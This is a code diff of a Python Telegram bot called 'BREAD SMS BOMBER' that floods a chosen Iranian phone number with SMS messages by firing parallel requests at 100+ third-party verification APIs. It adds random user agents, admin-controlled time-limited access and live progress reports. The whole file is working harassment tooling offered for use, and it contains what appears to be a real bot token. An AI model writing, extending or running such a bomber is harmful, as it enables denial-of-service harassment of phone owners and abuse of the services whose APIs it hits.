@@ -3,8 +3,7 @@
 
 """
 🍞 BREAD — SMS BOMBER TELEGRAM BOT
-ALL COMMANDS IN SINGLE FILE
-NO .env REQUIRED — ALL CONFIG IN FILE
+COMPLETE SINGLE FILE - FIXED FOR ALL PYTHON VERSIONS
 """
 
 import os
@@ -34,7 +33,7 @@ try:
     from telegram.constants import ParseMode
 except ImportError:
     print("Installing required packages...")
-    os.system("pip install python-telegram-bot==20.7 aiohttp fake-useragent")
+    os.system("pip install python-telegram-bot==20.0 aiohttp fake-useragent")
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
     from telegram.constants import ParseMode
@@ -52,7 +51,7 @@ except ImportError:
 class Config:
     # ====== EDIT THESE ======
     BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"  # Replace with your bot token
-    ADMIN_IDS = [8179218740]  # Replace with your admin user IDs (list of ints)
+    ADMIN_IDS = [8179218740]  # Replace with your admin user IDs
     
     # Bombing Configuration
     DEFAULT_DELAY = 500  # milliseconds between requests
@@ -61,15 +60,12 @@ class Config:
     MAX_PHONE_PER_USER = 10
     
     # API Configuration
-    API_TEMPLATES_FILE = 'api_templates.json'  # Your API file
+    API_TEMPLATES_FILE = 'api_templates.json'
     MAX_RETRIES = 2
     TIMEOUT = 8  # seconds
     
     # Database
     DATABASE_PATH = 'data/sms_bomber.db'
-    
-    # ====== DO NOT EDIT BELOW ======
-    LOG_LEVEL = logging.INFO
 
 # ============================================================
 # DATABASE MANAGER
@@ -82,11 +78,9 @@ class Database:
         self._init_db()
     
     def _init_db(self):
-        """Initialize database with all required tables"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             
-            # Users table with access management
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
@@ -102,7 +96,6 @@ class Database:
                 )
             ''')
             
-            # API statistics table
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS api_stats (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -114,7 +107,6 @@ class Database:
                 )
             ''')
             
-            # Attack logs
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS attack_logs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -130,7 +122,6 @@ class Database:
                 )
             ''')
             
-            # Active attacks
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS active_attacks (
                     user_id INTEGER PRIMARY KEY,
@@ -144,10 +135,8 @@ class Database:
             
             conn.commit()
     
-    # ========== USER MANAGEMENT ==========
-    
-    def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, expiry: str = None) -> bool:
-        """Add or update user with access expiry"""
+    def add_user(self, user_id: int, username: str = None, first_name: str = None, 
+                 last_name: str = None, expiry: str = None) -> bool:
         try:
             with sqlite3.connect(self.db_path) as conn:
                 cursor = conn.cursor()
@@ -163,7 +152,6 @@ class Database:
             return False
     
     def remove_user(self, user_id: int) -> bool:
-        """Remove user access"""
         try:
             with sqlite3.connect(self.db_path) as conn:
                 cursor = conn.cursor()
@@ -176,7 +164,6 @@ class Database:
             return False
     
     def get_user(self, user_id: int) -> Optional[Dict]:
-        """Get user data"""
         try:
             with sqlite3.connect(self.db_path) as conn:
                 cursor = conn.cursor()
@@ -191,7 +178,6 @@ class Database:
             return None
     
     def get_all_users(self) -> List[Dict]:
-        """Get all users"""
         try:
             with sqlite3.connect(self.db_path) as conn:
                 cursor = conn.cursor()
@@ -204,7 +190,6 @@ class Database:
             return []
     
     def user_has_access(self, user_id: int) -> bool:
-        """Check if user has valid access"""
         user = self.get_user(user_id)
         if not user:
             return False
@@ -219,23 +204,7 @@ class Database:
         except:
             return False
     
-    def update_user_activity(self, user_id: int):
-        """Update user's last active timestamp"""
-        try:
-            with sqlite3.connect(self.db_path) as conn:
-                cursor = conn.cursor()
-                cursor.execute('''
-                    UPDATE users SET last_active = CURRENT_TIMESTAMP 
-                    WHERE user_id = ?
-                ''', (user_id,))
-                conn.commit()
-        except:
-            pass
-    
-    # ========== ATTACK MANAGEMENT ==========
-    
     def start_attack(self, user_id: int, phone_number: str) -> str:
-        """Start a new attack and return attack_id"""
         attack_id = str(uuid.uuid4())[:8]
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
@@ -259,8 +228,7 @@ class Database:
             conn.commit()
         return attack_id
     
-    def stop_attack(self, user_id: int):
-        """Stop an ongoing attack"""
+    def stop_attack(self, user_id: int) -> bool:
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             attack = cursor.execute('''
@@ -284,7 +252,6 @@ class Database:
         return False
     
     def get_active_attack(self, user_id: int) -> Optional[Dict]:
-        """Get active attack for user"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             cursor.execute('''
@@ -297,11 +264,9 @@ class Database:
         return None
     
     def is_attack_running(self, user_id: int) -> bool:
-        """Check if user has an active attack"""
         return self.get_active_attack(user_id) is not None
     
     def update_attack_stats(self, attack_id: str, success: int = 0, fail: int = 0):
-        """Update attack statistics"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             cursor.execute('''
@@ -321,7 +286,6 @@ class Database:
             conn.commit()
     
     def complete_attack(self, attack_id: str):
-        """Mark attack as complete"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             cursor.execute('''
@@ -331,7 +295,6 @@ class Database:
             conn.commit()
     
     def get_state(self) -> Dict:
-        """Get full system state"""
         users = self.get_all_users()
         active_attacks = []
         with sqlite3.connect(self.db_path) as conn:
@@ -348,18 +311,19 @@ class Database:
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             cursor.execute('SELECT SUM(requests_sent) FROM attack_logs')
-            total_requests = cursor.fetchone()[0] or 0
+            result = cursor.fetchone()
+            if result and result[0]:
+                total_requests = result[0]
         
         return {
             'users': users,
-            'active_attacks': len([a for a in active_attacks]),
+            'active_attacks': len([a for a in active_attacks if a]),
             'total_attacks': len(users),
             'total_requests': total_requests,
             'timestamp': datetime.now().isoformat()
         }
     
     def clear_state(self):
-        """Clear all data"""
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
             cursor.execute('DELETE FROM attack_logs')
@@ -379,7 +343,6 @@ class APIHandler:
         self.load_apis()
     
     def load_apis(self):
-        """Load API templates from JSON file"""
         try:
             if os.path.exists(Config.API_TEMPLATES_FILE):
                 with open(Config.API_TEMPLATES_FILE, 'r', encoding='utf-8') as f:
@@ -393,7 +356,6 @@ class APIHandler:
             self.api_templates = []
     
     def get_headers(self) -> Dict:
-        """Generate random headers"""
         return {
             'User-Agent': self.ua.random,
             'Accept': 'application/json, text/plain, */*',
@@ -401,56 +363,46 @@ class APIHandler:
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Content-Type': 'application/json',
-            'Origin': 'https://www.google.com',
-            'Referer': 'https://www.google.com/',
         }
     
-    def format_phone(self, phone: str, template: Dict) -> str:
-        """Format phone number according to template"""
+    def format_phone(self, phone: str) -> str:
         phone = re.sub(r'[^0-9]', '', phone)
-        # Remove leading 0 if present
-        if phone.startswith('0'):
-            phone = phone[1:]
-        # If template expects 0{phone}
-        if '{phone}' in str(template.get('url', '')) or '{phone}' in str(template.get('json', {})):
-            # Check if it wants 98{phone} or 0{phone}
-            if '98{phone}' in str(template):
-                return phone
-            elif '0{phone}' in str(template):
-                return '0' + phone
+        if len(phone) == 10:
+            phone = '0' + phone
         return phone
     
     async def send_request(self, template: Dict, phone: str, session: aiohttp.ClientSession) -> Tuple[bool, float, str]:
-        """Send a single request to an API"""
         try:
             url = template.get('url', '')
             method = template.get('method', 'GET').upper()
-            phone = self.format_phone(phone, template)
+            phone = self.format_phone(phone)
             
-            # Replace phone in URL
             url = url.replace('{phone}', phone)
+            if '98{phone}' in url:
+                url = url.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
             
             headers = self.get_headers()
             timeout = aiohttp.ClientTimeout(total=Config.TIMEOUT)
             
             start_time = time.time()
             
-            # Prepare request data
             json_data = template.get('json', {})
             if json_data:
-                # Replace phone in JSON
                 json_str = json.dumps(json_data)
                 json_str = json_str.replace('{phone}', phone)
+                if '98{phone}' in json_str:
+                    json_str = json_str.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
                 json_data = json.loads(json_str)
             
             data = template.get('data', {})
             if data:
                 data_str = json.dumps(data) if isinstance(data, dict) else str(data)
                 data_str = data_str.replace('{phone}', phone)
+                if '98{phone}' in data_str:
+                    data_str = data_str.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
                 if isinstance(data, dict):
                     data = json.loads(data_str)
             
-            # Send request
             async with session.request(
                 method=method,
                 url=url,
@@ -462,7 +414,6 @@ class APIHandler:
             ) as response:
                 elapsed = time.time() - start_time
                 
-                # Consider any 2xx status as success
                 if 200 <= response.status < 300:
                     return True, elapsed, f"Status: {response.status}"
                 elif response.status in [429, 503, 403]:
@@ -483,16 +434,13 @@ class BomberEngine:
     def __init__(self):
         self.api_handler = APIHandler()
         self.db = Database()
-        self._running_attacks = {}  # user_id -> asyncio.Task
-        self._stop_flags = {}  # user_id -> bool
+        self._stop_flags = {}
     
-    async def bomb_phone(self, user_id: int, phone: str, count: int) -> Tuple[int, int]:
-        """Execute bombing attack"""
+    async def bomb_phone(self, user_id: int, phone: str, count: int, update_callback=None) -> Tuple[int, int]:
         phone = re.sub(r'[^0-9]', '', phone)
         if not phone:
             return 0, 0
         
-        # Start attack in database
         attack_id = self.db.start_attack(user_id, phone)
         self._stop_flags[user_id] = False
         
@@ -504,34 +452,31 @@ class BomberEngine:
         if not apis:
             return 0, 0
         
-        # Randomize APIs for better distribution
         random.shuffle(apis)
-        
-        # Limit APIs to use
         apis = apis[:min(len(apis), 100)]
         
         start_time = time.time()
-        max_duration = Config.ATTACK_DURATION  # 5 minutes
+        max_duration = Config.ATTACK_DURATION
         
         async with aiohttp.ClientSession() as session:
             while sent < count:
-                # Check stop flag
                 if self._stop_flags.get(user_id, False):
                     break
                 
-                # Check duration
                 if time.time() - start_time > max_duration:
                     break
                 
-                # Check if still running in DB
                 if not self.db.is_attack_running(user_id):
                     break
                 
-                # Send requests in parallel
                 chunk_size = min(10, count - sent)
                 tasks = []
+                available_apis = [api for api in apis if api.get('capacity', 0) > 0]
+                if not available_apis:
+                    available_apis = apis
+                
                 for _ in range(chunk_size):
-                    api = random.choice(apis)
+                    api = random.choice(available_apis)
                     tasks.append(self.api_handler.send_request(api, phone, session))
                 
                 results = await asyncio.gather(*tasks)
@@ -543,28 +488,29 @@ class BomberEngine:
                         failed += 1
                     sent += 1
                 
-                # Update database stats
                 self.db.update_attack_stats(attack_id, successful, failed)
                 
-                # Small delay to avoid rate limiting
+                if update_callback:
+                    try:
+                        await update_callback(sent, successful, failed)
+                    except:
+                        pass
+                
                 await asyncio.sleep(0.1)
                 
                 if sent >= count:
                     break
         
-        # Mark attack as complete
         self.db.complete_attack(attack_id)
         self._stop_flags.pop(user_id, None)
         
         return successful, failed
     
     def stop_attack(self, user_id: int) -> bool:
-        """Stop a running attack"""
         self._stop_flags[user_id] = True
         return self.db.stop_attack(user_id)
     
     def is_attack_running(self, user_id: int) -> bool:
-        """Check if user has a running attack"""
         return self.db.is_attack_running(user_id)
 
 # ============================================================
@@ -577,13 +523,9 @@ class SMSBomberBot:
         self.bomber = BomberEngine()
         self._active_tasks = {}
     
-    # ========== COMMAND HANDLERS ==========
-    
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /start command"""
         user = update.effective_user
         
-        # Register user if not exists
         if not self.db.get_user(user.id):
             self.db.add_user(
                 user_id=user.id,
@@ -591,6 +533,10 @@ class SMSBomberBot:
                 first_name=user.first_name,
                 last_name=user.last_name
             )
+        
+        has_access = self.db.user_has_access(user.id)
+        user_data = self.db.get_user(user.id)
+        expiry = user_data.get('access_expiry') if user_data else None
         
         welcome_text = f"""
 🍞 **BREAD SMS BOMBER** 🍞
@@ -600,7 +546,7 @@ Welcome {user.first_name}!
 🚀 **Commands:**
 /start - Show this message
 /help - Show help information
-/bomb <phone> <count> - Start bombing (e.g., /bomb 09123456789 100)
+/bomb <phone> <count> - Start bombing
 /stop - Stop ongoing attack
 
 📱 **Features:**
@@ -609,14 +555,14 @@ Welcome {user.first_name}!
 - 5-minute attack duration
 - Real-time statistics
 
-⚠️ **Access Required:** You need to be added by an admin to use the bot.
+**Access Status:** {'✅ **Active**' if has_access else '❌ **No Access**'}
+{f'⏱️ **Expires:** {expiry[:16]}' if expiry and has_access else ''}
 
-**Bot Status:** {"✅ Active" if self.db.user_has_access(user.id) else "❌ No Access"}
+{'ℹ️ Contact admin to get access.' if not has_access else ''}
 """
         await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
     
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /help command"""
         user_id = update.effective_user.id
         is_admin = user_id in Config.ADMIN_IDS
         
@@ -628,18 +574,21 @@ Welcome {user.first_name}!
   Example: /bomb 09123456789 100
   
 /stop - Stop your ongoing attack
-
+"""
+        
+        if is_admin:
+            help_text += """
 **Admin Commands:**
 /add <user_id> <duration> - Add user access
   Duration: 1m, 1h, 1d, 1w, 1mo
-  Example: /add 123456789 1d
   
 /remove <user_id> - Remove user access
-  Example: /remove 123456789
 
 /state - Show system state (JSON)
 /clear_state - Clear all data
-
+"""
+        
+        help_text += """
 **Duration Format:**
 - 1m = 1 minute
 - 1h = 1 hour  
@@ -648,46 +597,33 @@ Welcome {user.first_name}!
 - 1mo = 1 month
 
 **Attack Features:**
-- Uses 100+ Iranian APIs
+- Uses 100+ APIs
 - 5-minute attack duration
 - Auto-stops after 5 minutes
-- Real-time progress updates
-"""
-        
-        if is_admin:
-            help_text += """
-🔑 **Admin Features:**
-- Add/remove user access
-- View system state
-- Clear all data
 """
         
         await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
     
     async def bomb_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /bomb command"""
         user_id = update.effective_user.id
         
-        # Check if user has access
         if not self.db.user_has_access(user_id):
             await update.message.reply_text(
                 "❌ **Access Denied!**\n\n"
                 "You don't have access to this bot.\n"
-                "Please contact the admin to get access.",
+                "Contact the admin to get access.",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
         
-        # Check if already running
         if self.bomber.is_attack_running(user_id):
             await update.message.reply_text(
                 "⚠️ **Attack Already Running!**\n\n"
-                "You have an ongoing attack. Use /stop to stop it first.",
+                "Use /stop to stop it first.",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
         
-        # Parse arguments
         args = context.args
         if len(args) < 2:
             await update.message.reply_text(
@@ -695,7 +631,7 @@ Welcome {user.first_name}!
                 "Usage: /bomb <phone> <count>\n"
                 "Example: /bomb 09123456789 100\n\n"
                 "Phone: 11-digit Iranian number\n"
-                "Count: Number of SMS to send (max 1000)",
+                "Count: SMS to send (max 1000)",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
@@ -711,37 +647,48 @@ Welcome {user.first_name}!
             await update.message.reply_text("❌ Count must be a number!")
             return
         
-        # Validate phone
         phone = re.sub(r'[^0-9]', '', phone)
         if len(phone) == 10:
             phone = '0' + phone
         if len(phone) != 11 or not phone.startswith('0'):
             await update.message.reply_text(
                 "❌ **Invalid Phone Number!**\n\n"
-                "Please enter a valid 11-digit Iranian phone number.\n"
+                "Enter a valid 11-digit Iranian phone number.\n"
                 "Example: 09123456789",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
         
-        # Start attack
-        await update.message.reply_text(
+        attack_msg = await update.message.reply_text(
             f"🚀 **Attack Started!**\n\n"
             f"📱 Phone: {phone}\n"
             f"📊 Count: {count}\n"
             f"⏱️ Duration: 5 minutes max\n\n"
-            "Use /stop to stop the attack.\n"
-            "⚠️ Do not spam this command!",
+            f"Use /stop to stop the attack.",
             parse_mode=ParseMode.MARKDOWN
         )
         
-        # Run attack in background
+        async def update_progress(sent, success, failed):
+            try:
+                await attack_msg.edit_text(
+                    f"🚀 **Attack in Progress...**\n\n"
+                    f"📱 Phone: {phone}\n"
+                    f"✅ Sent: {sent}/{count}\n"
+                    f"✅ Success: {success}\n"
+                    f"❌ Failed: {failed}\n"
+                    f"⏱️ Running...",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            except:
+                pass
+        
         async def run_attack():
-            success, failed = await self.bomber.bomb_phone(user_id, phone, count)
+            success, failed = await self.bomber.bomb_phone(
+                user_id, phone, count, update_progress
+            )
             
-            # Send completion message
             total = success + failed
-            await update.message.reply_text(
+            await attack_msg.edit_text(
                 f"✅ **Attack Completed!**\n\n"
                 f"📱 Phone: {phone}\n"
                 f"✅ Success: {success}\n"
@@ -751,18 +698,13 @@ Welcome {user.first_name}!
                 parse_mode=ParseMode.MARKDOWN
             )
         
-        # Create and store task
         task = asyncio.create_task(run_attack())
         self._active_tasks[user_id] = task
-        
-        # Clean up after completion
         task.add_done_callback(lambda t: self._active_tasks.pop(user_id, None))
     
     async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /stop command"""
         user_id = update.effective_user.id
         
-        # Check if user has access
         if not self.db.user_has_access(user_id):
             await update.message.reply_text("❌ Access Denied!")
             return
@@ -784,12 +726,10 @@ Welcome {user.first_name}!
     # ========== ADMIN COMMANDS ==========
     
     async def add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /add command (admin only)"""
         user_id = update.effective_user.id
         
-        # Check if admin
         if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command!")
+            await update.message.reply_text("❌ You are not authorized!")
             return
         
         args = context.args
@@ -798,12 +738,7 @@ Welcome {user.first_name}!
                 "❌ **Invalid Usage!**\n\n"
                 "Usage: /add <user_id> <duration>\n"
                 "Example: /add 123456789 1d\n\n"
-                "Duration format:\n"
-                "1m = 1 minute\n"
-                "1h = 1 hour\n"
-                "1d = 1 day\n"
-                "1w = 1 week\n"
-                "1mo = 1 month",
+                "Duration: 1m, 1h, 1d, 1w, 1mo",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
@@ -812,25 +747,22 @@ Welcome {user.first_name}!
             target_user_id = int(args[0])
             duration_str = args[1].lower()
         except ValueError:
-            await update.message.reply_text("❌ Invalid user ID format!")
+            await update.message.reply_text("❌ Invalid user ID!")
             return
         
-        # Parse duration
         duration_map = {
-            'm': 60,  # minutes
-            'h': 3600,  # hours
-            'd': 86400,  # days
-            'w': 604800,  # weeks
-            'mo': 2592000  # months (30 days)
+            'm': 60,
+            'h': 3600,
+            'd': 86400,
+            'w': 604800,
+            'mo': 2592000
         }
         
-        # Extract number and unit
         match = re.match(r'^(\d+)([mhdw]|mo)$', duration_str)
         if not match:
             await update.message.reply_text(
-                "❌ **Invalid Duration Format!**\n\n"
-                "Use: 1m, 1h, 1d, 1w, 1mo\n"
-                "Example: 1d = 1 day",
+                "❌ **Invalid Duration!**\n\n"
+                "Use: 1m, 1h, 1d, 1w, 1mo",
                 parse_mode=ParseMode.MARKDOWN
             )
             return
@@ -846,7 +778,6 @@ Welcome {user.first_name}!
         expiry = datetime.now() + timedelta(seconds=total_seconds)
         expiry_str = expiry.isoformat()
         
-        # Try to get user info
         try:
             target_user = await context.bot.get_chat(target_user_id)
             username = target_user.username
@@ -857,26 +788,22 @@ Welcome {user.first_name}!
             first_name = None
             last_name = None
         
-        # Add user to database
         if self.db.add_user(target_user_id, username, first_name, last_name, expiry_str):
             await update.message.reply_text(
-                f"✅ **User Added Successfully!**\n\n"
-                f"🆔 User ID: {target_user_id}\n"
+                f"✅ **User Added!**\n\n"
+                f"🆔 ID: {target_user_id}\n"
                 f"👤 User: {first_name or 'Unknown'}\n"
                 f"⏱️ Duration: {duration_str}\n"
-                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"The user now has access to the bot.",
+                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}",
                 parse_mode=ParseMode.MARKDOWN
             )
             
-            # Notify the user
             try:
                 await context.bot.send_message(
                     target_user_id,
                     f"✅ **Access Granted!**\n\n"
-                    f"You now have access to the SMS Bomber Bot.\n"
-                    f"⏱️ Your access expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                    f"Use /help to see available commands.",
+                    f"Access expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
+                    f"Use /help to see commands.",
                     parse_mode=ParseMode.MARKDOWN
                 )
             except:
@@ -885,12 +812,10 @@ Welcome {user.first_name}!
             await update.message.reply_text("❌ Failed to add user!")
     
     async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /remove command (admin only)"""
         user_id = update.effective_user.id
         
-        # Check if admin
         if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command!")
+            await update.message.reply_text("❌ You are not authorized!")
             return
         
         args = context.args
@@ -906,24 +831,21 @@ Welcome {user.first_name}!
         try:
             target_user_id = int(args[0])
         except ValueError:
-            await update.message.reply_text("❌ Invalid user ID format!")
+            await update.message.reply_text("❌ Invalid user ID!")
             return
         
-        # Remove user
         if self.db.remove_user(target_user_id):
             await update.message.reply_text(
-                f"✅ **User Removed Successfully!**\n\n"
-                f"🆔 User ID: {target_user_id}\n\n"
-                f"The user no longer has access to the bot.",
+                f"✅ **User Removed!**\n\n"
+                f"🆔 User ID: {target_user_id}",
                 parse_mode=ParseMode.MARKDOWN
             )
             
-            # Notify the user
             try:
                 await context.bot.send_message(
                     target_user_id,
                     "❌ **Access Revoked!**\n\n"
-                    "Your access to the SMS Bomber Bot has been revoked by the admin.",
+                    "Your access has been revoked by admin.",
                     parse_mode=ParseMode.MARKDOWN
                 )
             except:
@@ -932,28 +854,22 @@ Welcome {user.first_name}!
             await update.message.reply_text("❌ Failed to remove user!")
     
     async def state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /state command (admin only)"""
         user_id = update.effective_user.id
         
-        # Check if admin
         if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command!")
+            await update.message.reply_text("❌ You are not authorized!")
             return
         
-        # Get state
         state = self.db.get_state()
-        
-        # Format as JSON
         json_state = json.dumps(state, indent=2, default=str)
         
-        # Send as file if too long
         if len(json_state) > 4000:
             with open('state_temp.json', 'w', encoding='utf-8') as f:
                 f.write(json_state)
             await update.message.reply_document(
                 document=open('state_temp.json', 'rb'),
                 filename='state.json',
-                caption="📊 Full system state"
+                caption="📊 System State"
             )
             os.remove('state_temp.json')
         else:
@@ -964,69 +880,58 @@ Welcome {user.first_name}!
             )
     
     async def clear_state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle /clear_state command (admin only)"""
         user_id = update.effective_user.id
         
-        # Check if admin
         if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command!")
+            await update.message.reply_text("❌ You are not authorized!")
             return
         
-        # Confirm
         await update.message.reply_text(
             "⚠️ **Are you sure?**\n\n"
-            "This will delete ALL data including:\n"
-            "- All users\n"
-            "- All attack logs\n"
-            "- All statistics\n\n"
+            "This will delete ALL data!\n"
             "Type /confirm_clear to proceed.",
             parse_mode=ParseMode.MARKDOWN
         )
-        
         context.user_data['pending_clear'] = True
     
     async def confirm_clear_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Confirm clear state"""
         user_id = update.effective_user.id
         
-        # Check if admin
         if user_id not in Config.ADMIN_IDS:
-            await update.message.reply_text("❌ You are not authorized to use this command!")
+            await update.message.reply_text("❌ You are not authorized!")
             return
         
         if context.user_data.get('pending_clear'):
             self.db.clear_state()
             context.user_data['pending_clear'] = False
             await update.message.reply_text(
-                "✅ **State Cleared Successfully!**\n\n"
+                "✅ **State Cleared!**\n\n"
                 "All data has been deleted.",
                 parse_mode=ParseMode.MARKDOWN
             )
         else:
             await update.message.reply_text(
-                "ℹ️ **No pending clear operation.**\n\n"
+                "ℹ️ No pending clear operation.\n"
                 "Use /clear_state first.",
                 parse_mode=ParseMode.MARKDOWN
             )
     
-    # ========== ERROR HANDLER ==========
-    
     async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        """Handle errors"""
         print(f"Error: {context.error}")
         if update and update.effective_message:
-            await update.effective_message.reply_text(
-                "❌ **An error occurred!**\n\n"
-                "Please try again later or contact the admin.",
-                parse_mode=ParseMode.MARKDOWN
-            )
+            try:
+                await update.effective_message.reply_text(
+                    "❌ An error occurred! Please try again.",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            except:
+                pass
 
 # ============================================================
 # MAIN APPLICATION
 # ============================================================
 
 def main():
-    """Main entry point"""
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
     ║                                                               ║
@@ -1037,16 +942,10 @@ def main():
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     
-    # Create data directory
     os.makedirs('data', exist_ok=True)
     
-    # Check API file
     if not os.path.exists(Config.API_TEMPLATES_FILE):
         print(f"⚠️ Warning: {Config.API_TEMPLATES_FILE} not found!")
-        print("📝 Please place your API templates file in the same directory.")
-        print("📝 Creating example API file...")
-        
-        # Create example API file
         example_apis = [
             {
                 "source": "example.com",
@@ -1060,13 +959,10 @@ def main():
             json.dump(example_apis, f, indent=2)
         print(f"✅ Created example API file: {Config.API_TEMPLATES_FILE}")
     
-    # Create bot instance
     bot = SMSBomberBot()
     
-    # Create application
+    # Create application with proper builder pattern
     application = Application.builder().token(Config.BOT_TOKEN).build()
-    
-    # ========== REGISTER COMMANDS ==========
     
     # User commands
     application.add_handler(CommandHandler("start", bot.start_command))
@@ -1081,39 +977,15 @@ def main():
     application.add_handler(CommandHandler("clear_state", bot.clear_state_command))
     application.add_handler(CommandHandler("confirm_clear", bot.confirm_clear_command))
     
-    # Error handler
     application.add_error_handler(bot.error_handler)
     
-    # ========== START BOT ==========
-    
-    print("""
-    🔥 BOT IS RUNNING! 🔥
-    
-    Commands:
-    /start     - Welcome message
-    /help      - Help information
-    /bomb      - Start bombing
-    /stop      - Stop bombing
-    
-    Admin Commands:
-    /add       - Add user access
-    /remove    - Remove user access
-    /state     - View system state
-    /clear_state - Clear all data
-    """)
-    
-    print(f"✅ Bot token: {Config.BOT_TOKEN[:20]}...")
+    print(f"✅ Bot token: {Config.BOT_TOKEN[:15]}...")
     print(f"✅ Admin IDs: {Config.ADMIN_IDS}")
     print(f"✅ API file: {Config.API_TEMPLATES_FILE}")
     print(f"✅ Database: {Config.DATABASE_PATH}")
     print("\n🚀 Starting bot...")
     
-    # Run the bot
     application.run_polling(allowed_updates=Update.ALL_TYPES)
-
-# ============================================================
-# ENTRY POINT
-# ============================================================
 
 if __name__ == "__main__":
     main()
